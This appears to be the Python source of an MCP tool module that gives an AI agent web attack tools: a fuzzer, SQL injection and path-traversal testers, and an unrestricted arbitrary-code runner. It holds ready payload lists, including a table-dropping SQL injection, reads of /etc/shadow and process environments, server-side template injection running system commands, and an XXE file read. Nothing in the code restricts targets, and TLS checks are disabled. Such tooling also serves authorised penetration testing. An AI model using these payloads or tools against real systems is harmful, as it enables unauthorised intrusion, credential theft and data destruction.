"""
Web tools:
  - http_request    : make HTTP requests with custom headers, cookies, body
  - fuzz_params     : fuzz a URL/form parameter with a wordlist or payload list
  - sqli_test       : quick SQLi detection and union-based extraction
  - lfi_test        : test LFI/path traversal payloads
  - run_webscript   : arbitrary Python requests/BeautifulSoup code
"""

from mcp.types import Tool

from tools.utils import MAX_HTTP_TIMEOUT, clamp_int, run_python

web_tools = [
    Tool(
        name="http_request",
        description=(
            "Make an HTTP request. "
            "Supports GET, POST, PUT, DELETE. "
            "Can set headers, cookies, body (JSON or raw). "
            "Returns status code, response headers, and body."
        ),
        inputSchema={
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "method": {"type": "string", "enum": ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"], "default": "GET"},
                "headers": {"type": "object", "description": "Dict of header name→value"},
                "cookies": {"type": "object", "description": "Dict of cookie name→value"},
                "body": {"type": "string", "description": "Raw body string"},
                "json_body": {"type": "object", "description": "JSON body (sets Content-Type automatically)"},
                "follow_redirects": {"type": "boolean", "default": True},
                "timeout": {
                    "type": "integer",
                    "default": 15,
                    "minimum": 1,
                    "maximum": MAX_HTTP_TIMEOUT,
                    "description": f"Per-request timeout in seconds (1-{MAX_HTTP_TIMEOUT}; capped below the global tool timeout)",
                },
            },
            "required": ["url"],
        },
    ),
    Tool(
        name="fuzz_params",
        description=(
            "Fuzz a URL parameter or POST field with a list of payloads. "
            "Mark the injection point with FUZZ in the url or body_template (required). "
            "Returns responses that differ from the baseline."
        ),
        inputSchema={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "URL with FUZZ marker, e.g. https://site.com/page?id=FUZZ"},
                "method": {"type": "string", "enum": ["GET", "POST", "PUT", "DELETE"], "default": "GET"},
                "body_template": {"type": "string", "description": "Body with FUZZ marker (for POST/PUT)"},
                "payloads": {"type": "array", "items": {"type": "string"}, "description": "List of fuzz strings"},
                "preset": {"type": "string", "enum": ["sqli", "xss", "lfi", "ssti", "xxe"], "description": "Use a built-in payload preset"},
                "headers": {"type": "object"},
            },
            "required": ["url"],
        },
    ),
    Tool(
        name="sqli_test",
        description=(
            "Test a parameter for SQL injection. "
            "Tries error-based, boolean-based, and time-based payloads. "
            "Mark the injection point with FUZZ in the url or body_template (required). "
            "Reports anomalies in response length, status, or timing."
        ),
        inputSchema={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL (FUZZ marks the injectable param, or use body_template)"},
                "method": {"type": "string", "enum": ["GET", "POST", "PUT", "DELETE"], "default": "GET"},
                "body_template": {"type": "string", "description": "Body with FUZZ marker (for POST/PUT injection)"},
                "db_type": {"type": "string", "enum": ["auto", "mysql", "postgres", "sqlite", "mssql"], "default": "auto"},
            },
            "required": ["url"],
        },
    ),
    Tool(
        name="lfi_test",
        description="Test a parameter for Local File Inclusion / path traversal (Unix and Windows). Mark the point with FUZZ in url or body_template.",
        inputSchema={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "URL with FUZZ marker on the file parameter"},
                "method": {"type": "string", "enum": ["GET", "POST", "PUT", "DELETE"], "default": "GET"},
                "body_template": {"type": "string", "description": "Body with FUZZ marker (for POST/PUT injection)"},
                "depth": {"type": "integer", "description": "Max traversal depth (default: 6)", "minimum": 1, "maximum": 8},
            },
            "required": ["url"],
        },
    ),
    Tool(
        name="run_webscript",
        description=(
            "Run arbitrary Python web code. "
            "requests, BeautifulSoup4, lxml, and httpx are available. "
            "Print results to stdout."
        ),
        inputSchema={
            "type": "object",
            "properties": {
                "code": {"type": "string"},
            },
            "required": ["code"],
        },
    ),
]

PAYLOADS = {
    "sqli": [
        "'", "''", "\"", "1' OR '1'='1", "1 OR 1=1", "' OR 1=1--",
        "1; DROP TABLE users--", "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--", "1 AND SLEEP(3)--", "1 AND 1=2",
    ],
    "xss": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "'\"><script>alert(1)</script>", "<svg/onload=alert(1)>",
        "javascript:alert(1)", "<body onload=alert(1)>",
    ],
    "lfi": [
        "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
        "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
        "..%2Fetc%2Fpasswd", "/etc/passwd", "/etc/shadow",
        "..\\..\\windows\\system32\\drivers\\etc\\hosts",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config}}",
        "{{''.__class__.__mro__}}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    ],
}

# --- SQLi payload / error building, keyed on db_type (fixes db_type being unused) ---
SQLI_GENERIC = [
    "'", "''", "\"", "1' OR '1'='1", "1 OR 1=1", "' OR 1=1--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "1 AND 1=2",
]
SQLI_TIME = {
    "mysql": ["1 AND SLEEP(3)-- -", "' OR SLEEP(3)-- -"],
    "postgres": ["1; SELECT pg_sleep(3)-- -", "' OR pg_sleep(3)-- -"],
    "sqlite": [],  # no portable time primitive
    "mssql": ["1; WAITFOR DELAY '0:0:3'-- -", "' WAITFOR DELAY '0:0:3'-- -"],
}
DB_ERROR_SIGS = {
    "mysql": ["you have an error in your sql syntax", "mysql", "warning: mysql", "mariadb"],
    "postgres": ["pg_", "postgresql", "psql", "unterminated quoted string"],
    "sqlite": ["sqlite", "sqlite3", "unrecognized token"],
    "mssql": ["odbc", "sql server", "unclosed quotation", "microsoft ole db"],
    "generic": ["syntax error", "ora-", "sql error"],
}


def _sqli_payloads_and_errors(db_type: str) -> tuple[list[str], list[str]]:
    db_type = (db_type or "auto").lower()
    payloads = list(SQLI_GENERIC)
    if db_type == "auto":
        for tp in SQLI_TIME.values():
            payloads += tp
        errors = sorted({e for sigs in DB_ERROR_SIGS.values() for e in sigs})
    else:
        payloads += SQLI_TIME.get(db_type, [])
        errors = sorted(set(DB_ERROR_SIGS.get(db_type, []) + DB_ERROR_SIGS["generic"]))
    return payloads, errors


# Unix traversal targets (forward slashes) and Windows targets (backslashes).
UNIX_LFI_TARGETS = ["etc/passwd", "etc/shadow", "etc/hostname", "proc/self/environ"]
WIN_LFI_TARGETS = ["windows\\win.ini", "windows\\system32\\drivers\\etc\\hosts"]


def _build_lfi_payloads(depth: int) -> list[str]:
    traversals: list[str] = []
    for t in UNIX_LFI_TARGETS:
        for d in range(1, depth + 1):
            traversals.append("../" * d + t)
            traversals.append("..//" * d + t)
            traversals.append("%2e%2e%2f" * d + t)
        traversals.append("/" + t)  # absolute
    for t in WIN_LFI_TARGETS:
        for d in range(1, depth + 1):
            traversals.append("..\\" * d + t)
            traversals.append("..%5c" * d + t)
        traversals.append("C:\\" + t)  # absolute
    return traversals


def _has_fuzz(url: str, body: str | None) -> bool:
    return "FUZZ" in (url or "") or "FUZZ" in (body or "")


def _build_request_code(
    url: str,
    method: str = "GET",
    headers: dict | None = None,
    cookies: dict | None = None,
    body: str | None = None,
    json_body: dict | None = None,
    follow_redirects: bool = True,
    timeout: int = 15,
) -> str:
    parts = [
        "import requests",
        "s = requests.Session()",
    ]
    if headers:
        parts.append(f"s.headers.update({repr(headers)})")
    if cookies:
        parts.append(f"s.cookies.update({repr(cookies)})")

    kwargs: dict = {"timeout": timeout, "allow_redirects": follow_redirects, "verify": False}
    if json_body is not None:
        kwargs["json"] = json_body
    elif body:
        kwargs["data"] = body

    parts.append(f"r = s.request({repr(method)}, {repr(url)}, **{repr(kwargs)})")
    parts += [
        "print(f'Status: {r.status_code}')",
        "print(f'Headers: {dict(r.headers)}')",
        "print(f'Body ({len(r.text)} chars):')",
        "print(r.text[:4000])",
    ]
    return "\n".join(parts)


async def handle_web(name: str, args: dict) -> str:
    if name == "http_request":
        # Clamp the requested timeout to (0, MAX_HTTP_TIMEOUT] so it can't exceed
        # the global run_python kill and can't be zero/negative.
        timeout = clamp_int(args.get("timeout", 15), default=15, minimum=1, maximum=MAX_HTTP_TIMEOUT)
        code = _build_request_code(
            url=args["url"],
            method=args.get("method", "GET"),
            headers=args.get("headers"),
            cookies=args.get("cookies"),
            body=args.get("body"),
            json_body=args.get("json_body"),
            follow_redirects=args.get("follow_redirects", True),
            timeout=timeout,
        )
        return await run_python(code)

    if name == "fuzz_params":
        url_template = args["url"]
        method = args.get("method", "GET")
        body_template = args.get("body_template", "")
        headers = args.get("headers", {})
        payloads = args.get("payloads") or PAYLOADS.get(args.get("preset", ""), [])
        if not payloads:
            return "[error] provide payloads list or a valid preset (sqli, xss, lfi, ssti, xxe)"
        if not _has_fuzz(url_template, body_template):
            return "[error] no FUZZ marker found in url or body_template; nothing would be injected"

        req_timeout = min(10, MAX_HTTP_TIMEOUT)
        code_lines = [
            "import requests; requests.packages.urllib3.disable_warnings()",
            f"payloads = {repr(payloads)}",
            f"url_t = {repr(url_template)}",
            f"body_t = {repr(body_template)}",
            f"method = {repr(method)}",
            f"headers = {repr(headers)}",
            f"req_timeout = {req_timeout}",
            "baseline_len = None",
            "baseline_status = None",
            "try:",
            "    base_url = url_t.replace('FUZZ', '1')",
            "    base_body = body_t.replace('FUZZ', '1') if body_t else None",
            "    base_r = requests.request(method, base_url, data=base_body, headers=headers, timeout=req_timeout, verify=False)",
            "    baseline_len = len(base_r.text)",
            "    baseline_status = base_r.status_code",
            "    print(f'Baseline: status={baseline_status} len={baseline_len}')",
            "except Exception as e:",
            "    print(f'[warn] baseline request failed: {e}; diffs unavailable, reporting raw results')",
            "for p in payloads:",
            "    url = url_t.replace('FUZZ', requests.utils.quote(str(p), safe='')) if 'FUZZ' in url_t else url_t",
            "    body = body_t.replace('FUZZ', str(p)) if body_t else None",
            "    try:",
            "        r = requests.request(method, url, data=body, headers=headers, timeout=req_timeout, verify=False)",
            "        flags = []",
            "        if baseline_len is not None:",
            "            d = abs(len(r.text) - baseline_len)",
            "            if d > 50: flags.append(f'len_diff={d}')",
            "        if baseline_status is not None and r.status_code != baseline_status:",
            "            flags.append(f'status={r.status_code} (base {baseline_status})')",
            "        diff_s = str(abs(len(r.text) - baseline_len)) if baseline_len is not None else 'n/a'",
            "        flag = ' <-- INTERESTING' if flags else ''",
            "        print(f'[{r.status_code}] len={len(r.text):6d} diff={diff_s:>6}  payload={repr(p)}{flag}')",
            "    except Exception as e:",
            "        print(f'[err] {p}: {e}')",
        ]
        return await run_python("\n".join(code_lines))

    if name == "sqli_test":
        url = args["url"]
        method = args.get("method", "GET")
        body_template = args.get("body_template", "")
        if not _has_fuzz(url, body_template):
            return "[error] no FUZZ marker found in url or body_template; nothing would be injected"
        payloads, err_sigs = _sqli_payloads_and_errors(args.get("db_type", "auto"))

        req_timeout = min(8, MAX_HTTP_TIMEOUT)
        code_lines = [
            "import requests, time; requests.packages.urllib3.disable_warnings()",
            f"payloads = {repr(payloads)}",
            f"err_sigs = {repr(err_sigs)}",
            f"url_t = {repr(url)}",
            f"body_t = {repr(body_template)}",
            f"method = {repr(method)}",
            f"req_timeout = {req_timeout}",
            "baseline_len = None",
            "baseline_status = None",
            "try:",
            "    b_url = url_t.replace('FUZZ','1')",
            "    b_body = body_t.replace('FUZZ','1') if body_t else None",
            "    baseline_r = requests.request(method, b_url, data=b_body, timeout=req_timeout, verify=False)",
            "    baseline_len = len(baseline_r.text)",
            "    baseline_status = baseline_r.status_code",
            "    print(f'Baseline: status={baseline_status} len={baseline_len}')",
            "except Exception as e:",
            "    print(f'[warn] baseline request failed: {e}; length/status diffs unavailable')",
            "for p in payloads:",
            "    url = url_t.replace('FUZZ', requests.utils.quote(str(p), safe='')) if 'FUZZ' in url_t else url_t",
            "    body = body_t.replace('FUZZ', str(p)) if body_t else None",
            "    t0 = time.time()",
            "    try:",
            "        r = requests.request(method, url, data=body, timeout=req_timeout, verify=False)",
            "        elapsed = time.time() - t0",
            "        flags = []",
            "        if baseline_len is not None and abs(len(r.text) - baseline_len) > 100:",
            "            flags.append(f'len_diff={abs(len(r.text) - baseline_len)}')",
            "        if elapsed > 2.5: flags.append(f'slow={elapsed:.1f}s')",
            "        if baseline_status is not None and r.status_code != baseline_status:",
            "            flags.append(f'status={r.status_code}')",
            "        low = r.text.lower()",
            "        for err in err_sigs:",
            "            if err in low: flags.append(f'db_err={err}')",
            "        if flags:",
            "            print(f'POTENTIAL SQLI: {repr(p)} -> {flags}')",
            "        else:",
            "            print(f'  ok  {repr(p)}')",
            "    except Exception as e:",
            "        print(f'[err] {p}: {e}')",
        ]
        return await run_python("\n".join(code_lines))

    if name == "lfi_test":
        url = args["url"]
        method = args.get("method", "GET")
        body_template = args.get("body_template", "")
        if not _has_fuzz(url, body_template):
            return "[error] no FUZZ marker found in url or body_template; nothing would be injected"
        depth = clamp_int(args.get("depth", 6), default=6, minimum=1, maximum=8)
        traversals = _build_lfi_payloads(depth)

        req_timeout = min(8, MAX_HTTP_TIMEOUT)
        code_lines = [
            "import requests; requests.packages.urllib3.disable_warnings()",
            f"payloads = {repr(traversals)}",
            f"url_t = {repr(url)}",
            f"body_t = {repr(body_template)}",
            f"method = {repr(method)}",
            f"req_timeout = {req_timeout}",
            "found = []",
            "markers = ['root:', 'bin/bash', 'PATH=', 'HOME=', 'for 16-bit app support', '[fonts]', '[extensions]', 'localhost']",
            "for p in payloads:",
            "    url = url_t.replace('FUZZ', requests.utils.quote(p, safe='')) if 'FUZZ' in url_t else url_t",
            "    body = body_t.replace('FUZZ', p) if body_t else None",
            "    try:",
            "        r = requests.request(method, url, data=body, timeout=req_timeout, verify=False)",
            "        low = r.text.lower()",
            "        if any(m.lower() in low for m in markers):",
            "            found.append(p)",
            "            print(f'[VULN] {p}')",
            "            print(r.text[:500])",
            "    except Exception:",
            "        pass",
            "if not found: print('No LFI found with tested payloads')",
        ]
        return await run_python("\n".join(code_lines))

    if name == "run_webscript":
        return await run_python(args["code"])

    return f"[error] unknown web tool: {name}"
